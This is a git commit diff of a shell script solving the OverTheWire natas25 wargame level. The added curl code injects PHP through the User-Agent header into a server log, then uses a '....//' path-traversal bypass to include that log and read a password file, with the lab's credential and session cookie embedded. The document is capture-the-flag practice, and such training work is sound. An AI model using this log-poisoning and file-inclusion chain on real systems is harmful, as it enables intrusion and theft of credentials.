dab57a546b2373e0c27254c0cfbd3db407764244
Orhan Aygün <orh.aygun@gmail.com>
2021-12-28 18:18:35 +0300

    Solution of natas25 to natas26

--- natas/natas-25-26/natas-25-26.sh
+++ natas/natas-25-26/natas-25-26.sh
@@ -2,7 +2,12 @@
 . ../natas.sh
 natas_url="http://natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c@natas25.natas.labs.overthewire.org"
 function hack() {
-	password=$(request 2>&1 | grep -Po "(?<=Password:\s)[\d\w]+")
+	 request-with-refereer "lang=natas_webpass" "<? include('/etc/natas_webpass/natas26'); ?>" 2>&1
+	 result=$(request "lang=....//logs/natas25_oc1abora817638lrk05h0hta53.log" 2>&1 | grep -Po "[\w\d]{32}")
+	 password=""
+	 for r in $result ; do
+	 	password=$r
+	done
 	echo $(get-natas-url "26" "$password")
 }
 
@@ -10,7 +15,16 @@ function request {
 	curl \
 		-vs \
 		-d "$1" \
-		--cookie "PHPSESSID=g6qelkr956e136o85udmse1417" \
+		--cookie "PHPSESSID=oc1abora817638lrk05h0hta53" \
+		$natas_url
+}
+
+function request-with-refereer {
+	curl \
+		-vs \
+		-d "$1" \
+		--header "User-Agent: $2" \
+		--cookie "PHPSESSID=oc1abora817638lrk05h0hta53" \
 		$natas_url
 }
 
@@ -20,16 +34,6 @@ function request-to-path() {
 		curl \
 		-vs \
 		-d "$2" \
-		--cookie "PHPSESSID=g6qelkr956e136o85udmse1417" \
-		$url
-}
-
-function spider-to-path() {
-		url=$(printf "$natas_url/$1")
-		echo $url
-		wget \
-		--spider \
-		--no-parent \
-		-r \
+		--cookie "PHPSESSID=oc1abora817638lrk05h0hta53" \
 		$url
 }
